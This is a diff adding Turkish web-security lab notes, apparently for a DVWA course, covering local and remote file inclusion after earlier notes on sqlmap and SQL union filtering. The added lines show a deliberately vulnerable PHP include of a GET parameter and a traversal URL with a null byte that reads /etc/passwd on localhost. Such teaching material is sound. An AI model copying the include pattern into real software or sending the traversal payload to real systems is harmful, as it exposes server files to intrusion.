@@ -182,7 +182,16 @@ python sqlmap.py -u "http://localhost/DVWA/vulnerabilities/sqli/?id=5&Submit=Sub
  echo $ad;
  -----------------------------------------------------------------------------------------------------------
 Yukarıdaki koddaki gibi unionu nasıl yazarsan yaz ekrana basmaz, 3osUNIsasON bunu 3ossas olarak ekrana yazar.
+---------------------------------------------------------------------------------------------------
+LFI(Local File Inculusin)
+RFI(Remote File Inculusin)
+<?php 
+$sayfa =$_GET['sayfa'];
+include($sayfa.'.php');
+ ?>
+http://localhost/lyk/lfi.php?sayfa=../../../../etc/passwd%00
 
+üstteki url kodu ile /etc/passwd ye ulaşabiliriz(yetkiniz varsa)
 
 
  
